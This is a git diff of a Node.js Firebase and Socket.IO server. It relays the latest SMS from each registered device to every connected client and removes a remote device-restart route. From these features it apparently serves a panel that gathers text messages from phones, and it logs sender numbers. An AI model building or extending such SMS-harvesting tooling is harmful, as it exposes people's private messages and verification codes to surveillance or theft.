@@ -1,5 +1,5 @@
 // =====================================================
-// server.js  (A-to-Z FINAL + SMS LIVE LOGGING)
+// server.js  (A-to-Z FINAL + SMS LIVE FIXED)
 // =====================================================
 
 import dotenv from "dotenv";
@@ -328,61 +328,107 @@ checkOnlineRef.on("child_added", handleCheckOnlineChange);
 checkOnlineRef.on("child_changed", handleCheckOnlineChange);
 
 // -----------------------------------------------------
-// DEVICE RESTART
+// 🔔 SMS LIVE HELPERS (1-LEVEL + 2-LEVEL SUPPORT)
 // -----------------------------------------------------
-app.post("/restart/:uid", async (req, res) => {
-  try {
-    const uid = clean(req.params.uid);
-    const now = Date.now();
+const SMS_NODE = "smsNotifications";
 
-    await rtdb.ref(`restart/${uid}`).set({
-      restartAt: now,
-      readable: new Date(now).toString(),
-    });
+function normalizeSmsListForUid(uid, rawNode) {
+  // rawNode can be:
+  // 1) { msgId: {body, timestamp, ...} }
+  // 2) { groupId: { msgId: {body, timestamp, ...} } }
+  const list = [];
 
-    console.log("🔁 RESTART TRIGGERED → uid=", uid);
+  if (!rawNode || typeof rawNode !== "object") return list;
 
-    return res.json({ success: true, restartAt: now });
-  } catch (err) {
-    console.error("❌ /restart ERROR:", err.message);
-    res.status(500).json({ success: false });
-  }
-});
+  Object.entries(rawNode).forEach(([k1, v1]) => {
+    if (v1 && typeof v1 === "object") {
+      const looksLikeSms =
+        "body" in v1 ||
+        "message" in v1 ||
+        "text" in v1 ||
+        "timestamp" in v1 ||
+        "date" in v1;
+
+      if (looksLikeSms) {
+        // pattern 1 → directly an sms
+        list.push({
+          id: k1,
+          uniqueid: uid,
+          ...v1,
+        });
+      } else {
+        // pattern 2 → second level objects
+        Object.entries(v1).forEach(([k2, v2]) => {
+          if (v2 && typeof v2 === "object") {
+            list.push({
+              id: k2,
+              uniqueid: uid,
+              ...v2,
+            });
+          }
+        });
+      }
+    }
+  });
+
+  return list;
+}
 
 // -----------------------------------------------------
-// SMS LIVE LAST MESSAGE ONLY
+// SMS LIVE LAST MESSAGE ONLY  (WITH LOGS)
 // -----------------------------------------------------
-const smsRef = rtdb.ref("smsNotifications");
+const smsRef = rtdb.ref(SMS_NODE);
 
-console.log("👂 ATTACHING LISTENER ON NODE: smsNotifications");
+console.log("👂 ATTACHING LISTENER ON NODE:", SMS_NODE);
 
 smsRef.on("child_added", handleSmsChange);
 smsRef.on("child_changed", handleSmsChange);
 
 async function handleSmsChange(snap) {
   const uid = snap.key;
-  const msgs = snap.val() || {};
+  const raw = snap.val() || {};
 
-  const keys = Object.keys(msgs);
-  if (keys.length === 0) return;
-
-  const latestId = keys[keys.length - 1];
-  const latestSms = msgs[latestId];
+  const smsList = normalizeSmsListForUid(uid, raw);
 
   console.log(
-    "📨 smsLogsAllLive NEW → uid=",
+    "📡 SMS NODE CHANGE → uid=",
+    uid,
+    " totalSmsFound=",
+    smsList.length,
+    " rawKeys=",
+    Object.keys(raw || {})
+  );
+
+  if (!smsList.length) {
+    console.log("⚠️ No SMS found for uid=", uid);
+    return;
+  }
+
+  // pick latest by timestamp (fallback lexicographic)
+  smsList.sort((a, b) => {
+    const ta = Number(a.timestamp || a.date || 0);
+    const tb = Number(b.timestamp || b.date || 0);
+    return tb - ta;
+  });
+
+  const latest = smsList[0];
+
+  console.log(
+    "📨 smsLogsAllLive EMIT → uid=",
     uid,
     " msgId=",
-    latestId,
-    " event=changed data=",
-    latestSms
+    latest.id,
+    " phone=",
+    latest.address || latest.from || latest.phone || "",
+    " ts=",
+    latest.timestamp || latest.date || ""
   );
 
   io.emit("smsLogsAllLive", {
     success: true,
     uniqueid: uid,
-    msgId: latestId,
-    data: { id: latestId, uniqueid: uid, ...latestSms },
+    msgId: latest.id,
+    data: latest,
   });
 }
 
@@ -421,13 +467,14 @@ refreshDevicesLive("initial");
 // -----------------------------------------------------
 // ROUTES MOUNTING
 // -----------------------------------------------------
-app.use("/api/sms", smsRoutes); // ⭐ /api/sms/all etc.
-
+app.use("/api/sms", smsRoutes); // /api/sms/all etc.
 app.use(adminRoutes);
 app.use("/api", checkRoutes);
 app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
 
+// -----------------------------------------------------
+// ROOT + LISTEN
 // -----------------------------------------------------
 app.get("/", (_, res) => {
   res.send("RTDB + Socket.IO Backend Running");
